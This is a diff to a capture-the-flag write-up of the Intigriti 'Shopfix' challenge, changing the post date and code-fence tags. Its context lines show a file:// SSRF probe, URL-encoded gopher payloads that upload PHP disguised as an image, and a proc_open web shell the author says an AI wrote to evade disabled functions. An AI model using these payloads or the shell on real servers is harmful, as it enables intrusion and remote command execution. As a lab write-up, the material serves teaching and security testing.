@@ -2,7 +2,7 @@
 layout: single
 title: Intigriti Challenge 1025
 excerpt: "Shopfix is a website that helps us render images from a URL, but... could that be the only thing it lets us do? Discover the solution(s) to this fun October challenge."
-date: 2023-04-22
+date: 2024-10-13
 classes: wide
 header:
   teaser: /assets/images/intigriti1025/portada.png
@@ -103,7 +103,7 @@ And BINGO: a new endpoint shows up, `upload_shoppix_images.php`, which looks lik
 Let’s analyze this file.
 
 **Payload: `file:///var/www/html/upload_shoppix_images.php?http`**
-```html
+```http
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -268,7 +268,7 @@ Now go to cyber chef and encode it in URL format.
 
 And finally, add it to the gopher payload and append the CRLF at the end.
 
-```html
+```http
 gopher://127.1:80/_POST%20%2Fupload%5Fshoppix%5Fimages%2Ephp%20HTTP%2F1%2E1%0D%0AHost%3A%20challenge%2D1025%2Eintigriti%2Eio%0D%0AContent%2DType%3A%20multipart%2Fform%2Ddata%3B%20boundary%3D%2D%2D%2D%2Dboundary%0D%0AContent%2DLength%3A%20190%0D%0A%0D%0A%2D%2D%2D%2D%2D%2Dboundary%0D%0AContent%2DDisposition%3A%20form%2Ddata%3B%20name%3D%22image%22%3B%20filename%3D%22s1x%2Ejpg%2Ephp%22%0D%0AContent%2DType%3A%20image%2Fjpeg%0D%0A%0D%0A%C3%BDPNG%0D%0A%1A%0D%0A%0D%0AIHDR%C3%BD%C3%BD%08%06%C3%A3T%04sBIT%08%08%08%08%7C%08%0D%0A%0D%0A%3C%3Fphp%20phpinfo%28%29%20%3F%3E%0D%0A%2D%2D%2D%2D%2D%2Dboundary%2D%2D%0D%0A
 ```
 
@@ -291,7 +291,7 @@ The same process with CyberChef
 
 Final payload:
 
-```html
+```http
 gopher://127.1:80/_POST%20%2Fupload%5Fshoppix%5Fimages%2Ephp%20HTTP%2F1%2E1%0D%0AHost%3A%20challenge%2D1025%2Eintigriti%2Eio%0D%0AContent%2DType%3A%20multipart%2Fform%2Ddata%3B%20boundary%3D%2D%2D%2D%2Dboundary%0D%0AContent%2DLength%3A%20157%0D%0A%0D%0A%2D%2D%2D%2D%2D%2Dboundary%0D%0AContent%2DDisposition%3A%20form%2Ddata%3B%20name%3D%22image%22%3B%20filename%3D%22s1x%2Ejpg%2Ephp%22%0D%0AContent%2DType%3A%20image%2Fjpeg%0D%0A%0D%0AGIF89a%3C%3Fphp%20phpinfo%28%29%3B%20%3F%3E%0D%0A%2D%2D%2D%2D%2D%2Dboundary%2D%2D%0D%0A
 ```
 
@@ -305,7 +305,7 @@ I’ll save you some time: after this, I tried to upload a web shell, but it kep
 
 How to make a web shell with this information? Easy: leverage AI to your advantage and ask it to build a web shell without using any of those functions, and this is what it produced.
 
-```php
+```http
 <?php if(function_exists('proc_open') && isset($_GET['c'])){   $d=[0=>["pipe","r"],1=>["pipe","w"],2=>["pipe","w"]];   $p=proc_open($_GET['c'],$d,$pipes);   if(is_resource($p)){fclose($pipes[0]); echo stream_get_contents($pipes[1]); fclose($pipes[1]); fclose($pipes[2]); proc_close($p);} } ?>
 ```
 
